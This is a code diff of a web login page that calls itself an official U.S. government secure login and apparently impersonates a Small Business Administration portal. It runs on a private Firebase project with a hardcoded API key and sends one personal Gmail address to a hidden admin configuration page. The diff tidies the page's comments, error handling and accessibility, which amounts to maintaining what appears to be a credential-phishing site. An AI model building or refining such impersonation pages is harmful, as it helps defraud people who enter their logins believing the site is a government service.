@@ -39,7 +39,7 @@
 <body>
 
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;" alt="US Flag">
         OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE LOGIN
     </div>
 
@@ -79,7 +79,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
-        // Verified Config from SBA-Portal-2026
+        // Verified Config from SBA-Portal-2026-F1253
         const firebaseConfig = {
             apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
             authDomain: "sba-portal-2026-f1253.firebaseapp.com",
@@ -106,12 +106,13 @@
                 const res = await signInWithEmailAndPassword(auth, email, pass);
                 const user = res.user;
 
-                // Admin Bypass for Abdulahi
+                // Admin Redirect for your primary email
                 if (email === "liger4683@gmail.com") {
                     window.location.href = 'system-config-v8.html';
                     return;
                 }
 
+                // Sync latest user status from Firebase Auth
                 await reload(user);
 
                 if (user.emailVerified) {
@@ -121,7 +122,8 @@
                 }
 
             } catch(err) {
-                alert("ACCESS DENIED: Credentials do not match our records.");
+                console.error("Login Error:", err);
+                alert("ACCESS DENIED: Credentials do not match our records or system is offline.");
                 loginBtn.innerText = "Login to Portal";
                 loginBtn.disabled = false;
             }
